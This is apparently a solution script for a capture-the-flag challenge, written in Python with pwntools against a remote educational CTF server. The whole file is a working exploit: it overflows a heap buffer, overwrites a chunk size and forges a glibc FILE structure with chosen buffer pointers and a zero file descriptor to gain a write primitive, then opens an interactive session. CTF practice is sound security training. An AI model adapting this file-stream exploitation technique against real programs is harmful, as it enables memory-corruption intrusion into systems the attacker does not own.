import pwn
#proc = pwn.process(["./chal"])
proc = pwn.remote("edu-ctf.zoolab.org", 10009)
payload = b"a" * 0x10
payload += b"\x00" * 8
payload += b"\xe1\x01"
payload += b"\x00" * 6

payload += 0xfbad0000.to_bytes(8, "little")      # flags
payload += b"\x00" * 8                           # read_ptr 
payload += b"\x00" * 8                           # read_end
payload += b"\x00" * 8                           # read_base 
payload += b"\x00" * 8                           # write_base 
payload += b"\x00" * 8                           # write_ptr 
payload += b"\x00" * 8                           # write_end
payload += 0x404070.to_bytes(8, "little")        # buf_base
payload += (0x404070+0x87).to_bytes(8, "little") # buf_end
payload += b"\x00" * 8 * 5 # save_base + backup_base + save_end + markers + chain
payload += int(0).to_bytes(8, "little")          # fd
#payload += b"\x00" * (0x1000 - len(payload))
proc.send(payload)
proc.send(b"A"*0x20)
proc.interactive()
#open("exp.pay", "wb").write(payload)